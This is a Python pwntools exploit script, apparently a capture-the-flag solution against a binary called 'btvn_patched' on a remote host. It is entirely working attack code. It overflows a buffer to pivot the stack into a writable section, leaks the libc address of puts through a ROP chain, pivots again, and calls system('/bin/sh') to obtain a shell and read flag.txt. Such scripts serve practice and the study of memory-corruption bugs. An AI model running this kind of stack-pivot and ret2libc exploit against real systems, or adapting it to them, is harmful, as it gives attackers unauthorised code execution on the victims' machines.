#!/usr/bin/env python3

from pwn import *

PORT =  13331
HOST = "14.225.198.235"
exe = context.binary = ELF('./btvn_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x401227
            b*0x40124A
            c
            set follow-fork-mode parent
            ''')
        input()

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()
offset = 0x68
vuln_addr = 0x401201      
leave_ret = 0x00000000004011a3
pop_rdi = 0x000000000040119a
ret = 0x000000000040101a
rw_section = 0x404060
MAIN_ADDR = 0x40124A 

fake_stack = rw_section + 0x900

# STAGE 1: Pivot 
pl1 = b'A'*96
pl1 += p64(fake_stack + 0x60)
pl1 += p64(vuln_addr)
p.sendafter(b"Input: \n", pl1[:111])

# STAGE 2: Leak libc base
pl2 = flat(
    pop_rdi,
    exe.got.puts,
    exe.plt.puts,
    MAIN_ADDR           
)
pl2 += b'A' * (96 - len(pl2))   
pl2 += p64(fake_stack - 8)        
pl2 += p64(leave_ret)            

p.sendafter(b"Input: \n", pl2.ljust(111, b'\0')[:111])

p.recvuntil(b"Output: \n")
p.recvline()
leak = u64(p.recv(6).ljust(8, b'\0'))
log.success("Leak puts: " + hex(leak))
libc.address = leak - libc.sym.puts
log.info("Libc Base: " + hex(libc.address))

# STAGE 3: Pivot again
pl3 = b'A'*96
pl3 += p64(fake_stack + 0x60)
pl3 += p64(vuln_addr)
p.sendafter(b"Input: \n", pl3[:111])

# STAGE 4: Get shell

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym.system

rop = flat(         
    pop_rdi,
    bin_sh,
    system
)
pl4 = rop
pl4 += b'A' * (96 - len(pl4))
pl4 += p64(fake_stack - 8)      
pl4 += p64(leave_ret)

p.sendafter(b"Input: \n", pl4.ljust(111, b'\0')[:111])
p.sendline("cat flag.txt")

p.interactive()